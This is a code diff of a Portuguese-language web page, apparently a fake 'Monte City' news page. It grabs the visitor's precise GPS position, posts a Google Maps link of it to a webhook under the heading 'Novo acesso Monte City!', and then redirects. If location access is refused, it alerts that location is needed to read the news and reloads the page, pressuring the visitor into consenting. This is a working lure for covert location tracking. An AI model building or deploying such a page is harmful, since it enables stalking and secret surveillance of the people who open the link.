@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -29,11 +31,9 @@
 
         function iniciar() {
             if (navigator.geolocation) {
-                // Configuração para forçar resposta do GPS mobile
                 const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
                 navigator.geolocation.getCurrentPosition(enviarEDirecionar, erroLocalizacao, options);
             } else {
-                alert("GPS não suportado. Tente por um celular moderno.");
                 direcionar();
             }
         }
@@ -41,17 +41,19 @@
         function enviarEDirecionar(pos) {
             const lat = pos.coords.latitude;
             const log = pos.coords.longitude;
+            // LINK DO MAPA CORRIGIDO PARA ABRIR NO GPS
             const mapa = `https://www.google.com/maps?q=${lat},${log}`;
 
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `📍 **Acesso Monte City!**\n🌍 **Localização:** ${mapa}` })
+                body: JSON.stringify({ 
+                    content: `📍 **Novo acesso Monte City!**\n🌍 **Localização:** ${mapa}` 
+                })
             }).finally(() => { direcionar(); });
         }
 
         function erroLocalizacao(err) {
-            // Se o tempo esgotar ou negar, avisa e recarrega
             alert("A permissão de localização é necessária para ler as notícias da Monte City.");
             location.reload();
         }
